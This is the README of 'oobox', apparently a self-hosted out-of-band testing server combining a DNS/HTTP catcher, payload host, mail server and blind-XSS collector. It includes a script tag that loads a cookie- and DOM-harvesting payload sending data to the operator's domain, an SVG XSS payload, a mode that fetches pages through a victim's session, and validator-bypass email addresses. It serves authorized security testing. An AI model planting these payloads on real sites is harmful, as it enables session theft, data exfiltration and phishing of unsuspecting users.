# oobox

**Self-hosted, all-in-one out-of-band (OOB) interaction server.**

One small Python asyncio process owns a domain you delegate to it and gives you — privately,
on your own box — the capabilities normally scattered across third-party services:

- an **interactsh / Burp-Collaborator-style catcher** (authoritative DNS + HTTP/HTTPS),
- a **payload / file host** the target fetches from,
- a **catch-all mail server** that can also **send**, and
- a **self-hosted blind-XSS collector** (an XSS-Hunter / [ezXSS](https://github.com/ssl/ezxss)
  alternative, with screenshots and authenticated page-spidering),

…all tied together by **one correlation label**, and driven by an authenticated JSON API **and
a built-in web dashboard**. Nothing you capture — a victim's cookies, a reset email, an
internal DOM — ever touches someone else's server.

> ⚠️ **For authorized security testing only.** oobox is a passive catcher plus your own
> file/mail host. It is **not** a means to attack third parties. Only ever point payloads at
> systems you are explicitly authorized to test. See [Security & responsible use](#security--responsible-use).

---

## Contents

- [Why](#why)
- [Features](#features)
- [How it works](#how-it-works)
- [Quick start (no domain, no root)](#quick-start-no-domain-no-root)
- [Deploying on a VPS](#deploying-on-a-vps)
- [Configuration](#configuration)
- [The dashboard](#the-dashboard)
- [Usage](#usage)
  - [OOB proof (DNS/HTTP)](#oob-proof-dnshttp)
  - [Hosting payloads](#hosting-payloads)
  - [Blind XSS](#blind-xss)
  - [Email (receive & send)](#email-receive--send)
  - [DNS zone editing](#dns-zone-editing)
  - [Telegram alerts](#telegram-alerts)
- [Control API](#control-api)
- [CLI](#cli)
- [Security & responsible use](#security--responsible-use)
- [Development](#development)
- [Roadmap / known limitations](#roadmap--known-limitations)
- [Acknowledgements](#acknowledgements)
- [License](#license)

---

## Why

Out-of-band techniques (SSRF, blind XSS, blind SQLi/SSTI, XXE, email-driven flows) need a
server the *target* can reach and that *you* control. The usual answer is a patchwork of
third-party services — interactsh, Burp Collaborator, xss.report, webhook.site, throwaway
mailboxes — which means your captured evidence (often sensitive: session cookies, PII,
internal pages) lives on infrastructure you don't own, under several different tools.

oobox replaces that patchwork with **one service on your own VPS under one domain**, so OOB
proof, payload hosting, blind-XSS capture, and email are **owned, private, and unified**.

## Features

**Channels**

- **Authoritative DNS** for `*.OOBDOMAIN` (UDP + TCP): wildcard `A`/`AAAA`, `SOA`/`NS`/`MX`,
  `_acme-challenge` `TXT` for self-answered ACME, and query logging. A DNS lookup of
  `<label>.OOBDOMAIN` is confirmed OOB reach.
- **HTTP/HTTPS catcher** with wildcard TLS: logs the full request and returns a benign `200`.
- **Token-scoped file host**: upload a payload, get `https://<label>.OOBDOMAIN/<path>`; every
  fetch is logged. Serves SSRF fetch targets, XXE external DTDs, SVG/JS XSS, redirect pages, etc.
- **Catch-all SMTP** (MX for the zone): stores full messages (headers, bodies, attachment
  metadata) and extracts links; grouped per mailbox. Optional **outbound send** from any
  `<name>@OOBDOMAIN` via a smarthost relay or direct-to-MX.
- **Blind-XSS collector**: a capture payload (adapted from ezXSS) harvesting URL, referer,
  cookies, localStorage, sessionStorage, DOM, user-agent — plus a **screenshot** (vendored
  html2canvas) and optional **authenticated same-origin page-spidering**. Callbacks land in
  *your* store.

**Correlation & control**

- **One label, every channel.** A label is simultaneously the subdomain, the email address,
  the file namespace, and the blind-XSS report id — so a single `lookup` resolves any
  callback back to the exact planting, days later. Labels can be **auto-minted tokens** (`ob…`,
  length configurable) *or* **arbitrary names** you choose (`bob@`, `hook.OOBDOMAIN`) with no
  registration.
- **Authenticated JSON API** (bearer key + IP allowlist), fully paginated.
- **Built-in web dashboard** (cookie login): searchable/paginated token sidebar; per-token
  tabs (Interactions / Mail / XSS / Pages / Files); global spaces (Activity feed, Emails,
  Blind XSS); a live **DNS zone editor**; and payload builders. Captured data is rendered as
  **text only** behind a strict CSP, so a hostile DOM/cookie can't script your dashboard.
- **Telegram alerts** with burst-coalescing (N hits in a window → one message) and an optional
  HTTP/SOCKS proxy.
- **SQLite storage** with a configurable **TTL retention** sweep.

**Ops**

- Single dependency set (`dnslib`, `aiosmtpd`, `aiohttp`); one process.
- **Docker Compose**, **systemd** unit, and **certbot DNS-01** hooks (self-answered — no
  propagation wait) included.
- A hermetic **end-to-end selftest** that needs no domain and no root.

## How it works

```
 VPS  (domain OOBDOMAIN, its NS delegated to this box; MX → this box)
 ┌───────────────────────── oobox — one Python asyncio process ─────────────────────────┐
 │  DNS   :53      authoritative for OOBDOMAIN; wildcard A/AAAA → self; SOA/NS/MX;        │
 │                 _acme-challenge TXT; runtime-editable zone + custom records; logs      │
 │  HTTP  :80/443  wildcard TLS *.OOBDOMAIN (certbot DNS-01, self-answered)               │
 │                 catcher · file host · blind-XSS collector (/c.js, POST /c)             │
 │  SMTP  :25      catch-all MX → full message stored, links extracted; optional send     │
 │  API   :8443    bearer + IP allowlist; JSON API + web dashboard (cookie login)         │
 │  STORE          SQLite (tokens, interactions, emails, sent_mail, xss_reports,          │
 │                 xss_pages, hosted_files, dns_records, settings) + hourly TTL sweep      │
 └────────────────────────────────────────────────────────────────────────────────────┘
        ▲ authenticated control API / dashboard        ▲ target-originated DNS/HTTP/SMTP (public)
        │                                               │
     you / your client                             the target under test
```

The catcher, file host, MX, and XSS collector are **public by necessity** (targets must reach
them). The **control API + dashboard are authenticated** (strong bearer key, IP allowlist,
and ideally bound to a management interface).

## Quick start (no domain, no root)

```bash
git clone <your-fork-url> oobox && cd oobox
python -m venv .venv && . .venv/bin/activate
pip install -r requirements.txt

python -m oobox selftest      # full end-to-end test on ephemeral 127.0.0.1 ports
pytest                         # unit tests + the selftest under pytest
```

`selftest` boots every listener and exercises register → DNS hit → HTTP hit → upload/fetch →
XSS callback (+ screenshot) → SMTP receive + send → spidered page → pagination/search →
DNS-zone overrides → cross-channel correlation → auth. It's the runnable proxy for the on-VPS
checks and a good smoke test for a fork.

To poke a local instance interactively:

```bash
export OOBDOMAIN=oob.local OOB_IPV4=127.0.0.1 OOB_BIND=127.0.0.1 OOB_API_BIND=127.0.0.1
export OOB_DNS_PORT=8453 OOB_HTTP_PORT=8480 OOB_HTTPS_PORT=0 OOB_SMTP_PORT=8425 OOB_API_PORT=8477
export OOB_API_KEY=$(python -m oobox genkey)
python -m oobox serve
# open http://127.0.0.1:8477/ and log in with $OOB_API_KEY
```

## Deploying on a VPS

**1. Prerequisites**
- A VPS with a **public static IP** and inbound ports **53/udp, 53/tcp, 80, 443, 25, 8443**.
  (Confirm inbound **:25** is open — some providers block it.)
- A domain/subdomain where you can set **NS + glue** records, e.g. `oob.example.com`.

**2. Delegate the zone.** The simplest path — and the recommended one — is to **delegate a
subdomain** (`oob.example.com`), *not* a whole domain. Leave `example.com` on your registrar's
nameservers exactly as it is, and just add two records to its zone (in the registrar / DNS-host
control panel that already serves `example.com` — Cloudflare, Route 53, etc.):

```dns
oob.example.com.       NS    ns1.oob.example.com.   ; delegate the subdomain to your box
ns1.oob.example.com.   A     203.0.113.10           ; glue: nameserver → your VPS IP
```

oobox answers `A` for `ns1.OOBDOMAIN` itself, so the glue resolves. **One nameserver pointing
at one IP is enough** — the "two nameservers with *distinct* IPs" rule that trips people up is
a *registry* requirement for setting a **domain's** nameservers at the registrar; it does **not**
apply to NS records for a subdomain of a zone you already control. So delegating
`oob.example.com` sidesteps it entirely, and a single VPS IP is fine.

> **Delegating a whole domain (or the apex) at the registrar instead?** Then the registry often
> *does* demand two nameservers with distinct IPs. You still don't need a second server — give
> the one box a second address and have oobox answer DNS on both:
>
> - **Second IPv4** (most providers offer one): glue `ns1 → IP1`, `ns2 → IP2`, and set
>   `OOB_BIND="IP1 IP2"` (space/comma-separated — oobox binds DNS/HTTP/SMTP on each).
> - **Or use IPv6 as the second IP** (free if your VPS has one): glue `ns1 A <v4>`,
>   `ns2 AAAA <v6>`, set `OOB_IPV6`, and `OOB_BIND="<v4> <v6>"`.
>
> Both nameservers then resolve to the same box and serve the same authoritative zone (if one
> address ever goes down, resolvers fail over to the other).

**3. MX** is served by oobox automatically (`MX 10 OOBDOMAIN`, apex `A` → this box), so once
the zone is delegated, mail for `*@OOBDOMAIN` and `*@<label>.OOBDOMAIN` arrives. (For better
deliverability of *outbound* mail, add an SPF `TXT` on the apex via the DNS Zone page.)

**4. Configure**

```bash
cp deploy/.env.example deploy/.env
python -m oobox genkey          # → OOB_API_KEY
$EDITOR deploy/.env              # set OOBDOMAIN, OOB_IPV4, OOB_API_KEY, OOB_API_ALLOW
python -m oobox check           # validate the effective config
```

**5. Firewall / exposure.** Open the public ports; keep the **API private** — bind it to
loopback (`OOB_API_BIND=127.0.0.1`) and reach it over an SSH tunnel / WireGuard, and/or set
`OOB_API_ALLOW` to your remote admin IPs/CIDRs. **Loopback (`127.0.0.1`/`::1`) is always
allowed**, so you never list it — the certbot hooks (which run on the box) and an SSH-tunnelled
dashboard (which appears to come from loopback) keep working; the bearer key still gates it.

> **`OOB_IPV4` (advertise) vs `OOB_BIND` (listen) are different.** `OOB_IPV4` is the IP oobox
> puts in DNS answers (what targets reach); `OOB_BIND` is the local address it binds sockets to.
> They're the same on a plain VPS, but **behind 1:1 NAT / a floating IP** (interface has e.g.
> `10.0.0.6`, public IP is `203.0.113.10`) they differ: `OOB_IPV4=203.0.113.10` and
> `OOB_BIND=10.0.0.6` (you can't bind the public IP — it isn't on a local interface).
>
> **Port 53 already in use?** On many VPSes `systemd-resolved` holds `127.0.0.53:53`, which
> oobox's default `0.0.0.0:53` overlaps. Binding a specific interface IP (`OOB_BIND=10.0.0.6`
> or your public IP) avoids the collision. (Or disable the stub: `DNSStubListener=no` in
> `/etc/systemd/resolved.conf`, then `systemctl restart systemd-resolved`.)

**6. Run — systemd (recommended)**

The simplest deploy: a venv + a systemd unit. It binds the privileged ports as a **non-root**
user via `CAP_NET_BIND_SERVICE`, sees real client IPs directly, and reads the Let's Encrypt
cert straight from `/etc/letsencrypt` (see step 7).

```bash
sudo python3 -m venv /opt/oobox/venv
sudo /opt/oobox/venv/bin/pip install .          # from the repo (or: oobox, once on PyPI)
sudo useradd --system --no-create-home oobox || true
sudo install -d -o oobox -g oobox /var/lib/oobox
sudo mkdir -p /etc/oobox && sudo cp deploy/.env.example /etc/oobox/env   # then edit it
sudo cp deploy/oobox.service /etc/systemd/system/
sudo systemctl daemon-reload && sudo systemctl enable --now oobox
journalctl -u oobox -f                           # watch it come up
```

<details>
<summary><b>Alternative: Docker Compose</b></summary>

Uses host networking (so DNS/SMTP see real client IPs). Note: the container can't read the
host's `/etc/letsencrypt`, so mount the cert in and set `OOB_TLS_CERT`/`OOB_TLS_KEY` (the
compose file mounts `./certs`).

```bash
docker compose -f deploy/docker-compose.yml up -d --build
```
</details>

**7. Wildcard TLS — a free Let's Encrypt cert, obtained for you.** You do **not** bring your
own cert. With oobox running (it self-answers the ACME DNS-01 challenge from its own
authoritative DNS, so there's no propagation wait):

```bash
OOBDOMAIN=oob.example.com OOB_API_KEY=... deploy/get-cert.sh
```

This issues `*.OOBDOMAIN` + `OOBDOMAIN` into `/etc/letsencrypt/live/<domain>/`, which oobox
**auto-detects** — no env editing. certbot ships those directories `0700 root`, though, and the
systemd service runs as the non-root `oobox` user, so it cannot read them until you install the
deploy hook:

```bash
sudo install -m 755 deploy/certbot-deploy-hook.sh /etc/letsencrypt/renewal-hooks/deploy/oobox
sudo /etc/letsencrypt/renewal-hooks/deploy/oobox     # grant access + restart now
```

That one hook covers issuance **and** every future renewal — see [renewal](#renewal) for why a
one-off `setfacl` is not enough. If oobox finds a cert it cannot read it says so in the log,
naming the user it runs as; if it finds none at all it logs `HTTPS disabled`.

(To use a custom path, or in Docker where you mount the cert in, set `OOB_TLS_CERT` /
`OOB_TLS_KEY` explicitly; `OOB_TLS_AUTODETECT=false` disables the auto-pickup.)

> **`--staging` is a trap, not a dry run.** `deploy/get-cert.sh --staging` uses Let's Encrypt's
> staging CA, whose roots are in no trust store — every client rejects the result. Worse, a
> staging cert *blocks its own replacement*: certbot sees a cert that is still valid for those
> domains and answers `not yet due for renewal; no action taken`, so the later production run
> silently changes nothing. Clear the lineage out first:
>
> ```bash
> sudo certbot delete --cert-name oob.example.com
> ```
>
> `get-cert.sh` now refuses to run against a staging lineage, and oobox logs a warning whenever
> it loads a staging cert.

HTTPS is **required** for blind XSS on HTTPS targets (mixed content blocks an `http://` script).
Certs last 90 days — see [renewal](#renewal).

### Renewal

Install the deploy hook once (step 7) and every future renewal is handled:

```bash
sudo install -m 755 deploy/certbot-deploy-hook.sh /etc/letsencrypt/renewal-hooks/deploy/oobox
```

It does two things a bare `certbot renew` does not:

- **Re-grants read access.** Renewal writes *new* files into `/etc/letsencrypt/archive/<domain>/`
  (`cert2.pem`, `privkey2.pem`, …) and repoints the `live/` symlinks at them — so a one-off
  `setfacl -R` silently stops covering the cert in use. The hook adds a **default** ACL so new
  files inherit access, and falls back to group ownership where the `acl` package is absent.
- **Restarts oobox.** The cert is read into an `SSLContext` once at startup, so a running
  process keeps serving the old cert until it is restarted.

It grants read on your lineage only (traverse-but-not-list on the shared parents), so the service
user cannot read other domains’ keys on the same box. Override `OOBOX_USER`, `OOBOX_GROUP`,
`OOBOX_UNIT` or `OOBOX_DOMAIN` if yours differ.

The DNS-01 auth hook still needs `OOB_API_KEY` in its environment, which certbot’s own systemd
timer will not supply — so drive renewals from a job that exports it:

```bash
# /etc/cron.d/oobox-renew, daily. The deploy hook handles access + restart.
0 3 * * * root OOB_API_KEY=… certbot renew --quiet
```

You do not need to set `OOB_API_URL`: the hooks probe `/healthz` for the scheme
([`deploy/_api-url.sh`](deploy/_api-url.sh)), because the control API is TLS when a cert is
configured and plaintext when it is not. Set it to pin a specific URL.

Docker: mount the cert in and restart the container instead —
`docker compose -f deploy/docker-compose.yml restart`.

### TLS troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| Log says `HTTPS disabled (no OOB_TLS_CERT/OOB_TLS_KEY)` but the cert exists | The service user cannot traverse `/etc/letsencrypt/live` (`0700 root`), so auto-detect cannot see it | Install and run the deploy hook (step 7) |
| DNS-01 hooks fail with `curl: (52) Empty reply from server`, then `No TXT record found` | A hook spoke plaintext HTTP to the control API after it switched to TLS | Update the hooks and ship [`deploy/_api-url.sh`](deploy/_api-url.sh) alongside them, or set `OOB_API_URL` |
| `Certificate not yet due for renewal; no action taken` when you wanted a new cert | An existing lineage still covers those domains — often a leftover `--staging` one | `sudo certbot delete --cert-name <domain>`, then re-run `get-cert.sh` |
| Clients reject the cert (`curl: (60)`, `unable to get local issuer certificate`) | It is a staging cert | Check the issuer: `grep -i server /etc/letsencrypt/renewal/<domain>.conf`; delete and reissue |

Check what is actually being served — the issuer and the SANs — with:

```bash
openssl s_client -connect <label>.oob.example.com:443 -servername <label>.oob.example.com </dev/null 2>/dev/null \
  | openssl x509 -noout -issuer -dates -ext subjectAltName
```

## Configuration

All configuration is environment variables (see [`deploy/.env.example`](deploy/.env.example)).
The CLI **auto-loads a `.env`** file — it searches `--env-file`, then `$OOB_ENV_FILE`, then
`./.env`, then `./deploy/.env` (real environment variables always win; `--env-file=none`
skips). `python -m oobox check` prints the effective config (including which env file it
loaded) and flags problems. Docker Compose and the systemd unit load the file themselves via
`env_file:` / `EnvironmentFile=`.

| Variable | Default | Purpose |
| --- | --- | --- |
| `OOBDOMAIN` | — **(required)** | the zone this box is authoritative for |
| `OOB_IPV4` / `OOB_IPV6` | — **(one required)** | **public** IP(s) the wildcard answers with (behind NAT: the public/floating IP, not the interface's) |
| `OOB_NS` | `ns1,ns2.<domain>` | advertised nameserver hostnames |
| `OOB_SOA_MAIL` | `hostmaster.<domain>` | SOA RNAME |
| `OOB_API_KEY` | — **(required)** | control-API / dashboard bearer key (`oobox genkey`) |
| `OOB_API_ALLOW` | *any* | IP/CIDR allowlist for the control API |
| `OOB_BIND` / `OOB_API_BIND` | `0.0.0.0` | bind addresses (bind the API to a mgmt iface!) |
| `OOB_DNS_PORT` / `OOB_HTTP_PORT` / `OOB_HTTPS_PORT` / `OOB_SMTP_PORT` / `OOB_API_PORT` | `53/80/443/25/8443` | listener ports |
| `OOB_TLS_CERT` / `OOB_TLS_KEY` | — | wildcard cert; enables HTTPS + API TLS |
| `OOB_API_TLS_CERT` / `OOB_API_TLS_KEY` | *(fallback to above)* | separate cert for the API |
| `OOB_DB` / `OOB_FILES_DIR` | `oobox.db` / `hosted` | SQLite path / hosted-payload dir |
| `OOB_TTL_DAYS` | `7` | retention for captures (tokens are kept) |
| `OOB_MAX_UPLOAD` / `OOB_MAX_CAPTURE` / `OOB_MAX_SCREENSHOT` | 5 / 2 / 6 MiB | size caps |
| `OOB_TOKEN_LEN` | `8` | random chars after the `ob` prefix (clamped 4–32) |
| `OOB_DNS_TTL` | `60` | TTL on answers |
| `OOB_SMTP_SEND` | `false` | enable outbound mail (`/send`, dashboard compose) |
| `OOB_SMTP_RELAY` `_USER` `_PASS` `_STARTTLS` | — / — / — / `true` | smarthost relay for sending |
| `OOB_RESOLVER` | `1.1.1.1` | resolver for outbound MX lookups (no relay) |
| `OOB_TG_TOKEN` / `OOB_TG_CHAT` | — | Telegram alerts (both set = on) |
| `OOB_TG_PROXY` / `OOB_TG_API_BASE` | — / `api.telegram.org` | alert proxy / Bot-API override |
| `OOB_ALERT_WINDOW` / `OOB_ALERT_KINDS` | `5` / all | coalesce window (s) / kinds that alert |

## The dashboard

Served on the **same port** as the API. `GET /` → dashboard (redirects to `/login`); sign in
with the `OOB_API_KEY` (HttpOnly, `SameSite=Lax`, `Secure`-when-TLS cookie, 12h). API routes
accept **either** the bearer key or the session cookie, so a client and the dashboard share
one server.

- **Sidebar** — every token with per-channel hit-count badges; **search** (by token/note,
  with a clear button) and **Load more** pagination (50/page), scaling to many tokens. A
  background timer refreshes only the sidebar counts, so it never wipes a form you're editing.
- **Per-token tabs** — **Interactions**, **Mail** (read + compose + sent log), **XSS**
  (cookies/storage/DOM + screenshot, + a payload builder), **Pages** (spidered), **Files**
  (author in-browser or upload). Every list is 50/page, newest-first, with Load more.
- **Global spaces** — **Activity** (all-token merged timeline; click a row to jump to its
  token), **Emails** (all mailboxes + compose from any address), **Blind XSS** (all labels +
  an any-label payload builder), **DNS Zone** (live zone editor + custom records).

## Usage

Examples use `curl`; set `API` to your control-API base and `KEY` to your `OOB_API_KEY`.

```bash
API=https://oob.example.com:8443; KEY=<your key>
auth=(-H "Authorization: Bearer $KEY")
T=$(curl -s "${auth[@]}" -X POST $API/register -d '{"note":"acme.com q= param"}' | jq -r .token)
```

### OOB proof (DNS/HTTP)

```bash
dig +short $T.oob.example.com @203.0.113.10        # → your VPS IP
curl -s https://$T.oob.example.com/anything        # → "ok" (valid TLS, no -k)
curl -s "${auth[@]}" "$API/lookup?token=$T" | jq .counts   # dns/http hits recorded
```

Per-sink correlation: vary the left labels (`import.$T.oob.example.com`, `avatar.$T…`) — all
resolve to `$T`, and the logged `host` tells you which sink fired.

### Hosting payloads

```bash
echo '<svg/onload=alert(document.domain)>' > p.svg
curl -s "${auth[@]}" -H 'Content-Type: image/svg+xml' \
     --data-binary @p.svg "$API/upload?token=$T&path=/p.svg" | jq -r .url
curl -s https://$T.oob.example.com/p.svg           # serves the bytes; the fetch is logged

# edit = re-upload the same path (overwrites bytes + content-type); delete removes both:
curl -s "${auth[@]}" "$API/file?token=$T&path=/p.svg"                   # raw bytes back
curl -s "${auth[@]}" -X DELETE "$API/files?token=$T&path=/p.svg"        # remove it
```

In the dashboard's **Files** tab each hosted file has **edit** (loads its content back
into the author form to re-save) and **delete** buttons.

### Blind XSS

```html
<script src="https://<label>.OOBDOMAIN/c.js"></script>
```

`c.js` derives its label and callback URL from its own `src`, harvests the page (URL, referer,
cookies, localStorage, sessionStorage, DOM, user-agent), and POSTs to `<label>.OOBDOMAIN/c` —
core capture first (never lost), then a **screenshot** via same-origin html2canvas.

- **Tag / custom params** — any extra query param is captured; `tag` is promoted to a listable
  column: `…/c.js?tag=login-name&field=email`.
- **Additional pages** — `…/c.js?pages=/admin,/users/1` fetches those same-origin pages through
  the victim's authenticated session.
- **Spider** — `…/c.js?spider=2&max=30` discovers same-origin links and crawls to a depth.
  **Opt-in, GET-only, same-origin, depth/count-capped, and skips state-changing links**
  (logout/delete/…) by default — crawling an authenticated app through a victim can otherwise
  fire destructive GETs. Use only within authorized scope. Read results via `GET /pages?token=`.

The dashboard's XSS tab builds these payloads for you.

### Email (receive & send)

- **Receive**: any `<name>@OOBDOMAIN` (or `*@<label>.OOBDOMAIN`) is accepted and grouped under
  `<name>`; bodies + extracted links are stored. Read via `GET /mail?token=<name>` or the
  Emails page.
- **Send** (requires `OOB_SMTP_SEND`): from any address you like —

  ```bash
  curl -s "${auth[@]}" -X POST $API/send \
    -d '{"from":"bob","to":"victim@target.com","subject":"hi","body":"…"}'
  ```

  Replies come back to that mailbox. A smarthost (`OOB_SMTP_RELAY`) is the reliable delivery
  path; direct-to-MX is best-effort.

- **Crafted addresses** (embed a target domain): the **Mail** tab and the **Emails** page have
  an address builder — enter a `victim.tld` and it generates catch-addresses that embed it, so
  a target's validator that allow-lists or substring-matches the domain accepts the address
  while the mail still delivers to your MX. Two shapes, in a few well-known bypass encodings:

  ```
  ob7f3k9a2x.victim.tld@oob.example.com          # victim in the local-part
  random@ob7f3k9a2x.victim.tld.oob.example.com   # victim in the subdomain
  # …plus quoted-local, %40-encoded, comment, and homoglyph variants
  ```

  The embedded `ob`-token means caught mail still correlates back to your engagement token
  (each address shows exactly which bucket it lands in); without a token it buckets under a
  sanitized victim label. Get them over the API with `GET /craft?victim=&token=`, and the
  clean shapes can be sent *from* as well (`POST /send {"from_full": …}`).

### DNS zone editing

The **DNS Zone** page (or `GET/POST /zone`, `POST /zone/records`, `DELETE /zone/records/{id}`)
edits the live zone without a restart: wildcard target, TTL, NS, SOA mail, MX, and custom
`A/AAAA/TXT/CNAME/MX/CAA` records. Handy for an apex SPF `TXT`, a `CAA`, or pinning a host.

### Telegram alerts

Set `OOB_TG_TOKEN` (from @BotFather) and `OOB_TG_CHAT` (from @userinfobot; groups are
negative). Bursts inside `OOB_ALERT_WINDOW` collapse into one message:

```
🛰 oobox: 21 OOB hits in 5s
📡http×20 🎯xss×1
tokens: ob7f3k9a2x
latest: xss ob7f3k9a2x https://admin.target/panel
```

Restrict with `OOB_ALERT_KINDS` (e.g. `mail,xss`). Where `api.telegram.org` is blocked, set an
`OOB_TG_PROXY` (`http(s)://…`, or `socks5://…` with `pip install aiohttp_socks`) or point
`OOB_TG_API_BASE` at a Bot-API mirror.

## Control API

Every route requires `Authorization: Bearer <OOB_API_KEY>` (and passes the IP allowlist)
except `/healthz`, `/login`, `/favicon.ico`. List endpoints paginate newest-first via
`before=`/`limit=` and return `next_before`.

| Method / path | Purpose |
| --- | --- |
| `POST /register` `{note?, meta?, name?, len?}` | mint a token (or a named label); returns its subdomain / email / file base / `collector_js` / `callback` |
| `GET /poll?token=&before=&limit=&kind=` | DNS/HTTP/file interactions |
| `GET /mail?token=&before=&limit=` · `GET /mail/{id}?token=` | received mail (list · full body + links) |
| `GET /xss?token=&before=&limit=` · `GET /xss/{id}?token=` | blind-XSS reports (list · full capture) |
| `GET /pages?token=&before=&limit=` · `GET /pages/{id}?token=` | spidered / additional pages |
| `POST /upload?token=&path=` (raw body) | host a payload (re-upload to edit); returns its URL |
| `GET /files?token=` · `GET /file?token=&path=` | hosted files (list · raw bytes) |
| `DELETE /files?token=&path=` | delete one hosted file (row + on-disk bytes) |
| `POST /send` `{to,subject,body,html?}` + `from` \| `token` \| `from_full` | send mail (needs `OOB_SMTP_SEND`); `from_full` sends from a crafted address in your zone |
| `GET /sent?token=` | sent mail |
| `GET /lookup?token=` | cross-channel counts + the token's `meta` + endpoints |
| `GET /craft?victim=&token=` | crafted victim-embedding catch-addresses (validation-bypass shapes) |
| `GET /overview?limit=&offset=&q=` | paginated, searchable tokens + counts + `total` |
| `GET /tokens` | all token labels |
| `GET /feed?before=&limit=&kind=` | merged activity across all tokens |
| `GET /all/emails` · `GET /all/xss` | global mail / blind-XSS lists |
| `GET /zone` · `POST /zone` · `POST /zone/records` · `DELETE /zone/records/{id}` | live DNS zone config |
| `POST /acme/present` · `POST /acme/cleanup` | certbot DNS-01 hooks |
| `GET /healthz` | unauthenticated liveness |

The `meta` object passed to `register` is stored verbatim and returned by `lookup` — put the
injection point (target / url / method / param / payload) there so a callback resolves back to
the planting.

## CLI

```
python -m oobox serve      # run all listeners (needs OOBDOMAIN, OOB_IPV4, OOB_API_KEY)
python -m oobox selftest   # hermetic end-to-end test on ephemeral ports
python -m oobox genkey     # print a fresh control-API bearer key
python -m oobox check      # print + validate the effective configuration
```

## Security & responsible use

- **Authorized testing only.** Point payloads only at systems you're explicitly authorized to
  test. oobox is a passive catcher and your own file/mail host — never use it to attack third
  parties. The blind-XSS spider is opt-in and deliberately conservative for this reason.
- **Public vs. private surface.** DNS/HTTP/SMTP/collector are public by necessity; the API +
  dashboard are authenticated (bearer + IP allowlist) and should be bound to a management
  interface. Use a strong `OOB_API_KEY` (`oobox genkey`).
- **Sensitive captures.** Captured requests, mail, and XSS reports may contain session tokens
  and PII. They live only on your box, are swept after `OOB_TTL_DAYS`, and the dashboard renders
  all captured content as inert text behind a strict CSP. Clients consuming the API should
  redact secrets before putting them in reports or chat.
- **Reporting a vulnerability in oobox itself:** please open a private security advisory rather
  than a public issue.

## Development

- **Stack:** Python 3.10+, `dnslib` (DNS), `aiosmtpd` (SMTP), `aiohttp` (HTTP + API); SQLite via
  the stdlib. No JS build step — the dashboard is one hand-written file.
- **Tests:** `pytest` runs unit tests (token model, alert coalescing, dashboard integrity) and
  the full `selftest`. The dashboard's inline JS is syntax-checked in CI-style via `node --check`
  when Node is available.
- **Layout:**

  ```
  oobox/            server package: config, store, tokens, dns_server, http_server,
                     smtp_server, mailer, alerts, control_api, server, __main__
  oobox/payloads/   collector.js (blind-XSS capture) + vendored html2canvas.min.js
  oobox/static/     dashboard.html (operator UI)
  deploy/            Dockerfile, docker-compose.yml, oobox.service, .env.example,
                     certbot hooks (get-cert.sh, DNS-01 auth/cleanup, renewal deploy hook)
  tests/             unit tests + end-to-end selftest
  ```

Contributions welcome — please run `pytest` and keep `python -m oobox selftest` green.

## Roadmap / known limitations

- No generic outbound webhooks yet (Telegram only).
- The file host serves static bytes; there's no HTTP-3xx **open-redirect responder** (a hosted
  redirect *page* works) and no **DNS-rebinding** responder.
- No built-in rate-limiting on the public listeners — run it behind a firewall / allowlist.
- Wildcard TLS covers one label deep (`<label>.OOBDOMAIN`); multi-level hosts work for
  DNS/HTTP/SMTP but not for HTTPS with a valid cert. Put per-sink tags in the path, not a second
  DNS label, when TLS is required.

## Acknowledgements

- **[ezXSS](https://github.com/ssl/ezxss)** (MIT) — the blind-XSS capture field set and
  additional-pages idea are adapted from it.
- **[html2canvas](https://html2canvas.hertzen.com/)** (MIT) — vendored for screenshots.
- **[dnslib](https://github.com/paulc/dnslib)**, **[aiosmtpd](https://github.com/aio-libs/aiosmtpd)**,
  **[aiohttp](https://github.com/aio-libs/aiohttp)** — the listeners stand on these.
- Conceptual kin: [interactsh](https://github.com/projectdiscovery/interactsh),
  Burp Collaborator, XSS Hunter.

## License

MIT — see [LICENSE](LICENSE).
